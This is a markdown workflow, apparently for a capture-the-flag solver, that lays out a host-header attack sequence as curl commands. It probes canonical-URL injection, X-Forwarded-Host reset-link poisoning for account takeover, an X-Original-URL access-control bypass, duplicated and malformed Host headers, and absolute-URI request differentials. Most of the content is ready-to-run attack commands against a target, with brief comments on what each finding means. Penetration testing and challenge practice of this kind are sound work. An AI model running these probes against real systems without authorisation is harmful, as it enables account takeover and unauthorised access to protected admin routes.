# Workflow — the host-header attack sequence

The ordered probes — from surface to downstream to readback.

---

## 1. Recon — map the host-header surface

```bash
# the host-header surface — a reflected host
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 2. Detect — name the mechanism

```text
a reflected host → the app's canonical URLs point to canary.example →
a stored injection — a canonical-URL sink.
a reflected forwarded header → the app's reset links point to
canary.example → an account takeover — a reset-link sink.
a middleware rewrite → a 200 on the gated route → an ACL bypass — a
rewrite sink.
```

## 3. Probe — the canonical-URL sink

```bash
# the canonical-URL check — a reflected host
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
#   the canonical URLs point to canary.example → a stored injection
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links/scripts point to canary.example → a stored injection
```

## 4. Probe — the reset-link sink

```bash
# the reset-link check — a reflected forwarded header
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
#   the reset link points to canary.example → an account takeover
```

## 5. Probe — the rewrite sink

```bash
# the rewrite check — a middleware rewrite
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   a 200 on the gated route → the middleware rewrites the path → an ACL bypass
```

## 6. Probe — the forwarded-header sink

```bash
# the forwarded-header check — a forwarded header
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links point to canary.example → a stored injection
```

## 7. Probe — the duplicated Host sink

```bash
# the duplicated Host check — a parsing differential
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
```

## 8. Probe — the malformed Host sink

```bash
# the malformed Host check — a parsing edge
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator
```

## 9. Probe — the absolute-URI sink

```bash
# the absolute-URI check — a request-line differential
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "http://evil.example/" --resolve 'evil.example:443:127.0.0.1'   # an absolute-URI
```

## 10. Confirm — the host-header's reach

```text
the host-header's reach is the downstream — a canonical URL the app's
links rewrite — a reset link the victim clicks — a cache key the cache
stores — a Location the proxy redirects — a Set-Cookie the app binds —
a middleware rewrite the app's route reads.
```

## 11. The workflow's falsifier — when the surface is dead

```text
a proxy that validates the Host against a server list → a 400 on a bad
host → a negative result, not a retry signal.
a proxy that strips the client-supplied forwarded header → the header
doesn't reach the app → the bypass fails → a different class.
a proxy that verifies the forwarded header it added → a client-supplied
header is rejected → the bypass fails → a different class.
a trust check that reads a different input → a different class.
```

## 12. The workflow's budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
